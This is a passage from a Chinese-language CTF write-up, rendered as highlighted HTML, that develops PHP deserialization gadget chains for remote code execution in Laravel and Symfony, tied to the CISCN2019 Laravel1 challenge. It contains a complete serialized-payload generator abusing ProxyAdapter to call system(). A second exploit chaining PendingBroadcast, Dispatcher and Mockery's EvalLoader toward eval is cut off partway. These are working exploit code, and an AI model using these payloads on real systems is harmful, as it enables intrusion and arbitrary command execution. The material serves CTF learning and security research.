&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="链子2---rce">链子2 - rce&lt;/h2>
&lt;p>回到前面在相同命名空间下找&lt;code>saveDeferred()&lt;/code>的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
&lt;p>跟进&lt;code>doSave()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png" alt="image-20211204102953831">&lt;/p>
&lt;p>223行可以动态调用函数，&lt;code>setInnerItem&lt;/code>可控 我们可以调用&lt;code>system()&lt;/code>，接下来确认它调用的两个参数可不可控&lt;/p>
&lt;p>对于&lt;code>$item&lt;/code>，是调用函数&lt;code>doSave()&lt;/code>函数时传入的参数，也就是&lt;code>saveDeferred()&lt;/code>时的参数，也就是我们传入的数组，可控&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png" alt="image-20211204103425511">&lt;/p>
&lt;p>对于&lt;code>$innerItem&lt;/code>有这样一个if判断&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png" alt="image-20211204103829313">&lt;/p>
&lt;p>光看这个判断肥肠的突兀，还要结合207行的&lt;code>$item = (array) $item;&lt;/code>，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 &lt;em>protected&lt;/em>的属性冲突，所以需要在相同的命名空间里接着找一个类，包含&lt;code>pollHash&lt;/code>和&lt;code>innerItem&lt;/code>属性，最终还是找到了CacheItem（前面也是它&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
&lt;p>构造exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地尝试一下（懒得再开靶机了w&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
&lt;p>成功了捏&lt;/p>
&lt;h2 id="链子3---rce">链子3 - rce&lt;/h2>
&lt;p>在 &lt;strong>[CISCN2019 总决赛 Day1 Web4]Laravel1&lt;/strong>这道题里赵师傅把这条路堵死了，但是本地复现无所谓啦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png" alt="image-20211204105214847">&lt;/p>
&lt;p>把这个注释取消即可&lt;/p>
&lt;p>看到它调用了&lt;code>events&lt;/code>的&lt;code>dispatch&lt;/code>方法，跟上面思路一样，接着找一个可用的别的类里的&lt;code>dispatch&lt;/code>，比如vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png" alt="image-20211204110831694">&lt;/p>
&lt;p>看一下第一个判断的返回时调用的&lt;code>dispatchNow()&lt;/code>是什么&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png" alt="image-20211204133634260">&lt;/p>
&lt;p>150行有亮点啊，使用了&lt;code>call_user_func&lt;/code>，第一个参数可控，第二个参数来自&lt;code>$command&lt;/code>，也就是最开始找的析构函数调用的&lt;code>$this-&amp;gt;event&lt;/code>；现在要找一个类 可以执行任意函数作为第一个参数，然后我们的rce命令作为第二个参数传入，完成整个链子&lt;/p>
&lt;p>不过先不急，首先要满足&lt;code>dispatch()&lt;/code>中的if判断&lt;code>$this-&amp;gt;queueResolver &amp;amp;&amp;amp; $this-&amp;gt;commandShouldBeQueued($command)&lt;/code>，前一个可控，看看后面这个&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png" alt="image-20211204132803262">&lt;/p>
&lt;p>需要&lt;code>$command&lt;/code>必须是一个实现了&lt;code>ShouldQueue&lt;/code>接口的类，找到这个 vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png" alt="image-20211204133133796">&lt;/p>
&lt;p>然后接着找适合做&lt;code>call_user_func()&lt;/code>第一个参数的类，它需要可以执行任意函数 vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png" alt="image-20211204135811389">&lt;/p>
&lt;p>这个&lt;code>load()&lt;/code>可以直接调用eval执行代码，但是&lt;code>$defination&lt;/code>要满足if的判断，跟进&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png" alt="image-20211204140231175">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png" alt="image-20211204140248303">&lt;/p>
&lt;p>需要额外再找两个类，第一个类具有&lt;code>code&lt;/code>属性，第二类又&lt;code>getName&lt;/code>函数，来作为第一个类的config属性&lt;/p>
&lt;p>可用的第一个类就是&lt;code>getClassName()&lt;/code>所在的类 vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png" alt="image-20211204140502311">&lt;/p>
&lt;p>第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
&lt;p>总结以上的过程，写exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
